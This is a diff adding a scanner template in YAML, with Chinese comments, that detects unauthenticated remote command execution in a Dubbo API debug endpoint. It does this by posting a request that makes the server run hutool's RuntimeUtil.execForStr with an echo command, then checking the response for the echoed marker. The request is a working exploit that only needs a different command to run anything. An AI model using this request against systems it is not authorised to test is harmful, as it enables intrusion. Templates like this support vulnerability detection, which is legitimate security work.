@@ -1,0 +1,32 @@
+# Dubbo API Debug 远程命令执行
+# 某些内部系统的 Dubbo 管理接口 /papi/esearch/data/devops/dubboApi/debug/method
+# 未做鉴权，直接接受 interfaceName + methodName 参数，
+# 并通过 RuntimeUtil.execForStr 执行任意系统命令，导致 RCE。
+id: dubbo-api-debug-rce
+name: Dubbo API Debug 远程命令执行
+description: |
+  某些内部系统的 Dubbo 管理接口 /papi/esearch/data/devops/dubboApi/debug/method
+  未做鉴权，直接接受 interfaceName + methodName 参数，
+  并通过 RuntimeUtil.execForStr 执行任意系统命令，导致 RCE。
+severity: critical
+author: gosleek
+tags: [dubbo, rce, unauth, debug]
+
+http:
+  - method: POST
+    path:
+      - /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+      Content-Type: application/json
+      Accept-Encoding: gzip
+    body: '[["echo+QAXNB1238"]]'
+    timeout: 10
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words: ["QAXNB1238"]
+        condition: or
